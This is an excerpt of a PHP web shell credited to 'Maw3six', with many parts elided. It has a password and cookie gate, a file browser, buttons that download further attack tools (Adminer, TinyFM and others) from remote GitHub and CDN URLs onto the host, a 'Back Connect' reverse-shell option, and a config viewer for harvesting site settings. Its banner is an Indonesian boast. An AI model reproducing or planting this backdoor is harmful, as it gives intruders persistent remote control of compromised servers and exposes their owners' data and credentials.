...
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_COOKIE['auth_token']) && password_verify($hashed_password, $_COOKIE['auth_token'])) {
        ...
        echo '<form method="POST"><input type="password" name="password" required>';
        exit;
    }
}
...
function showFileTable($path)
{
	...
	<div>
    <h2>&copy; <?php echo date("Y"); ?> <a href="https://t.me/maw3six/">Maw3six</h2></a>
	</div>
    <?php
}
...
if (isset($_POST['Summon3'])) {
    $baseUrl = 'https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/tiny.php';
    $currentPath = @getCurrentDirectory();
...
<head>
  ...
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/maw3six/maw3six/bypassed/ironman.css">
</head>
<body>
    <div class="container">
        ...
        <div class="button-container">
            <form method="post" style="display: inline-block;">
                <input type="submit" name="Summon" value="Spawn Adminer" class="button">
            </form>
			  <form method="post" style="display: inline-block;">
                <input type="submit" name="Summon1" value="Spawn Gecko" class="button">
            </form>
			<form method="post" style="display: inline-block;">
                <input type="submit" name="Summon2" value="Spawn Maw3six" class="button">
            </form>
			<form method="post" style="display: inline-block;">
                <input type="submit" name="Summon3" value=" Spawn TinyFM" class="button">
            </form>
            <button type="button" onclick="window.location.href='?gas'" class="button"> Mail Test</button>
            <button type="button" onclick="window.location.href='?do=bc'" class="button">Back Connect</button>
            <button type="button" onclick="window.location.href='?dir=<?php echo $currentDirectory ?>&goo=config'" class="button"> Config</button>
        </div>
        <hr>
        <select onchange="location.href = this.value;">
...
<?php } ?>
	...
	<div class="container">
        <?php
        echo "<center>";
        echo "<h1>Rasanya Seperti IRONMAN! Anjing Banget !</h1>";
